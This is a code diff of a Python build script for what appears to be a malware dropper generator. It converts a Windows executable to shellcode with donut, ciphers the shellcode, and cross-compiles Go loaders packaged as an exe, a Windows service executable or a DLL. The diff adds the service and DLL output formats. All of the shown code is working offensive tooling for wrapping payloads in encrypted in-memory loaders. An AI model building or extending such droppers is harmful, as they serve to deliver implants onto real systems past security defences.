@@ -17,7 +17,7 @@ def donutTheExe(binaryPath: str, binaryArg: str):
     print("[+] Creating the shellcode with donut ...")
 
     popen = None
-    args = (donutPath, '-f', '1', "-x", "1", '-p', binaryArg, '-o', shellcodePath, '-i' , binaryPath)
+    args = (donutPath, '-f', '1', "-m", "RunMe", "-x", "1", '-p', binaryArg, '-o', shellcodePath, '-i' , binaryPath)
     try:
         popen = subprocess.Popen(args, stdout=subprocess.PIPE)
         popen.wait()
@@ -68,24 +68,28 @@ def cipherShellcode(shellcodePath: str):
     return cipheredShellcodePath, keyPath
 
 
+def generateDllGoDroplet(outputPrefix:str, arch: str):
+    extension = ".dll"
+    mainGoPath = "../cmd/dll64bit/main.go"
 
+    dllbitsPath = os.path.join(Path(__file__).parent, '../bin/' + outputPrefix + arch + extension)
+    dllbitsGoMainPath = os.path.join(Path(__file__).parent, mainGoPath)
 
-def generateExeGoDroplet(outputPrefix: str, arch: str):
-
-    exe64bitsPath = os.path.join(Path(__file__).parent, '../bin/' + outputPrefix + arch + ".exe")
-    exe64bitsGoMainPath = os.path.join(Path(__file__).parent, '../cmd/exe64bit/main.go')
-    args = ("go", "build", "-a", "-ldflags", "-s -w", "-o", exe64bitsPath, exe64bitsGoMainPath)
+    args = ("go", "build", "-a", "-buildmode", "c-shared", "-o", dllbitsPath, dllbitsGoMainPath)
 
     popen = None
-    exe64bits_env = os.environ.copy() 
-    exe64bits_env["GOOS"] = "windows"
-    exe64bits_env["GOARCH"] = arch
-    exe64bits_env["CGO_ENABLED"] = "0"
+    exebits_env = os.environ.copy() 
+    exebits_env["GOOS"] = "windows"
+    exebits_env["GOARCH"] = arch
+    exebits_env["CGO_ENABLED"] = "1"
+    exebits_env["CC"] = "x86_64-w64-mingw32-gcc"
+    exebits_env["CXX"] = "x86_64-w64-mingw32-g++"
+    exebits_env["GO111MODULE"] = "on"
 
-    print("[+] Creating " + arch + " exe dropper")
+    print("[+] Creating " + arch + " dll droplet")
 
     try:
-        popen = subprocess.Popen(args, stdout=subprocess.PIPE, env=exe64bits_env)
+        popen = subprocess.Popen(args, stdout=subprocess.PIPE, env=exebits_env)
         popen.wait()
         if popen.stdout != None:
             output = popen.stdout.read()
@@ -93,29 +97,91 @@ def generateExeGoDroplet(outputPrefix: str, arch: str):
 
         if popen.returncode != 0:
             raise Exception
-        if not os.path.isfile(exe64bitsPath):
-            print(arch + " Exe Droplet not created for some reason")
+        if not os.path.isfile(dllbitsPath):
+            print(arch + " dll Droplet not created for some reason")
             raise Exception
     except Exception as e:
         if popen and popen.stderr is not None:
             print(popen.stderr.read().decode("utf-8"))
         print(e)
-        print("[-] Failed to create " + arch + " exe droplet")
+        print("[-] Failed to create " + arch + " dll droplet")
         exit(1)
 
-    print("[+] Created " + arch + " exe dropper in " + exe64bitsPath)
-    return exe64bitsPath
+    print("[+] Created " + arch + " dll droplet in " + dllbitsPath)
+    return dllbitsPath
+
+
+def generateGeneralExeGoDroplet(outputPrefix: str, arch: str, service: bool):
+
+    extension = ".svc.exe" if service else ".exe" 
+    mainGoPath = "../cmd/svc64bit/main.go" if service else "../cmd/exe64bit/main.go"
+    serviceLogStrin = " service" if service else ""
+
+    exebitsPath = os.path.join(Path(__file__).parent, '../bin/' + outputPrefix + arch + extension)
+    exebitsGoMainPath = os.path.join(Path(__file__).parent, mainGoPath)
+    args = ("go", "build", "-a", "-ldflags", "-s -w", "-o", exebitsPath, exebitsGoMainPath)
+
+    popen = None
+    exebits_env = os.environ.copy() 
+    exebits_env["GOOS"] = "windows"
+    exebits_env["GOARCH"] = arch
+    exebits_env["CGO_ENABLED"] = "0"
+    exebits_env["GO111MODULE"] = "on"
+
+    print("[+] Creating " + arch + serviceLogStrin + " exe droplet")
+
+    try:
+        popen = subprocess.Popen(args, stdout=subprocess.PIPE, env=exebits_env)
+        popen.wait()
+        if popen.stdout != None:
+            output = popen.stdout.read()
+            print(output.decode("utf-8"))
+
+        if popen.returncode != 0:
+            raise Exception
+        if not os.path.isfile(exebitsPath):
+            print(arch + serviceLogStrin + " Exe Droplet not created for some reason")
+            raise Exception
+    except Exception as e:
+        if popen and popen.stderr is not None:
+            print(popen.stderr.read().decode("utf-8"))
+        print(e)
+        print("[-] Failed to create " + arch + serviceLogStrin + " exe droplet")
+        exit(1)
+
+    print("[+] Created " + arch + serviceLogStrin + " exe droplet in " + exebitsPath)
+    return exebitsPath
+
+
+def generateExeGoDroplet(outputPrefix: str, arch: str):
+    return generateGeneralExeGoDroplet(outputPrefix, arch, False)
+
+
+def generateSvcExeGoDroplet(outputPrefix: str, arch: str):
+    return generateGeneralExeGoDroplet(outputPrefix, arch, True)
 
 
 # Generate The GoDroplets
 def generateGoDroplets(binaryPath: str, binaryArg: str, format: str, outputPrefix: str):
+    listOfPath = []
+
     shellcodePath = donutTheExe(binaryPath, binaryArg)
     cipheredShellcodePath, keyPath = cipherShellcode(shellcodePath)
 
-    print(cipheredShellcodePath, keyPath)
+    match format:
+        case "exe":
+            listOfPath.append(generateExeGoDroplet(outputPrefix, "amd64"))
+        case "svc":
+            listOfPath.append(generateSvcExeGoDroplet(outputPrefix, "amd64"))
+        case "dll":
+            listOfPath.append(generateDllGoDroplet(outputPrefix, "amd64"))
+        case "all":
+            listOfPath.append(generateExeGoDroplet(outputPrefix, "amd64"))
+            listOfPath.append(generateSvcExeGoDroplet(outputPrefix, "amd64"))
+            listOfPath.append(generateDllGoDroplet(outputPrefix, "amd64"))
 
-    generateExeGoDroplet(outputPrefix, "amd64")
-    generateExeGoDroplet(outputPrefix, "386")
+    return listOfPath
+
 
 
 def main():
